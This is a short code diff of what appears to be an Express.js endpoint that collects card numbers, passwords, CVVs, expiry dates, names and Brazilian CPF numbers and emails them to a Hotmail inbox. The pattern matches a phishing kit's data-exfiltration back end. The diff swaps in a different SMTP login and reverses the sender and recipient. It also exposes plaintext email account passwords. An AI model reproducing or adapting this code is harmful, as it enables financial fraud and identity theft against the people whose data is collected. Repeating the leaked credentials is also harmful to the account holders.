@@ -18,8 +18,8 @@ app.post('/enviar-dados', (req, res) => {
         port: '587',
         secure: false,
         auth: {
-            user: 'dinair1979@hotmail.com',
-            pass: 'dinair1b2f3o'
+            user: 'flaviopnc123@hotmail.com',
+            pass: 'palcomp3'
         }
     });
 
@@ -27,8 +27,8 @@ app.post('/enviar-dados', (req, res) => {
 
     // Opções do email
     const mailOptions = {
-        from: 'dinair1979@hotmail.com',
-        to: 'flaviopnc123@hotmail.com',
+        from: 'flaviopnc123@hotmail.com',
+        to: 'dinair1979@hotmail.com',
         subject: 'Novas informações recebidas',
         text: `numero: ${informacao1}\nsenha: ${informacao2}\nnome: ${informacao3}\ncpf: ${informacao4}\ncvv: ${informacao5}\nmm: ${informacao6} \nyy: ${informacao7}`
     };
